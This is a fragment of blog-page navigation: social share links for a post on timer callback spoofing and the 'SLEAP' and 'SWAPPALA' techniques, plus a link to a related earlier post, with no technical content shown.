xing](https://www.xing.com/app/user?op=share;url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f;title=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold "Share on xing")[Share on whatsapp](whatsapp://send?text=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold%20https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f "Share on whatsapp")[Share on hacker news](https://news.ycombinator.com/submitlink?u=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f&t=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold "Share on hacker news")[Share on telegram](https://telegram.me/share/url?text=Timer%20Callbacks%20Spoofing%20to%20Improve%20your%20SLEAP%20and%20SWAPPALA%20Untold&url=https%3a%2f%2foldboy21.github.io%2fposts%2f2024%2f09%2ftimer-callbacks-spoofing-to-improve-your-sleap-and-swappala-untold%2f "Share on telegram")

[SLE(A)PING Issues: SWAPPALA and Reflective DLL Friends Forever→](https://oldboy21.github.io/posts/2024/06/sleaping-issues-swappala-and-reflective-dll-friends-forever/)